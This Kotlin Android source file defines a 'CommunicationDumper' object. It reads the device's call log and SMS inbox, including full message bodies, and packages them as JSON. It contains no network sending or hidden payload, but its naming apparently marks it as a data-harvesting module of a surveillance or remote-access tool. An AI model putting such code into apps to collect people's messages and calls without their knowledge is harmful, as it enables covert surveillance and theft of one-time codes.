package com.template.app

import android.content.Context
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

object CommunicationDumper {

    private const val TAG = "CommDumper"

    // ==========================================
    // ===== CALL LOGS =====
    // ==========================================
    fun getCallLogs(context: Context, limit: Int = 100): JSONObject {
        return try {
            val calls = mutableListOf<JSONObject>()
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                "${CallLog.Calls.DATE} DESC",
            )

            cursor?.use {
                val numberIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIdx = it.getColumnIndex(CallLog.Calls.DURATION)

                var count = 0
                while (it.moveToNext() && count < limit) {
                    calls.add(JSONObject().apply {
                        put("number", it.getString(numberIdx) ?: "")
                        put("name", it.getString(nameIdx) ?: "")
                        put("type", when (it.getInt(typeIdx)) {
                            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                            CallLog.Calls.MISSED_TYPE -> "MISSED"
                            CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                            else -> "UNKNOWN"
                        })
                        put("date", it.getLong(dateIdx))
                        put("duration", it.getInt(durationIdx))
                    })
                    count++
                }
            }

            JSONObject().apply {
                put("ok", true)
                put("calls", JSONArray(calls))
                put("count", calls.size)
            }
        } catch (e: Exception) {
            Log.e(TAG, "getCallLogs error", e)
            JSONObject().apply {
                put("ok", false)
                put("error", e.message)
            }
        }
    }

    // ==========================================
    // ===== SMS INBOX =====
    // ==========================================
    fun getSmsInbox(context: Context, limit: Int = 100): JSONObject {
        return try {
            val messages = mutableListOf<JSONObject>()
            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                "${Telephony.Sms.DATE} DESC",
            )

            cursor?.use {
                val addressIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIdx = it.getColumnIndex(Telephony.Sms.TYPE)

                var count = 0
                while (it.moveToNext() && count < limit) {
                    messages.add(JSONObject().apply {
                        put("address", it.getString(addressIdx) ?: "")
                        put("body", it.getString(bodyIdx) ?: "")
                        put("date", it.getLong(dateIdx))
                        put("type", if (it.getInt(typeIdx) == Telephony.Sms.MESSAGE_TYPE_INBOX) "INBOX" else "SENT")
                    })
                    count++
                }
            }

            JSONObject().apply {
                put("ok", true)
                put("messages", JSONArray(messages))
                put("count", messages.size)
            }
        } catch (e: Exception) {
            Log.e(TAG, "getSmsInbox error", e)
            JSONObject().apply {
                put("ok", false)
                put("error", e.message)
            }
        }
    }
}
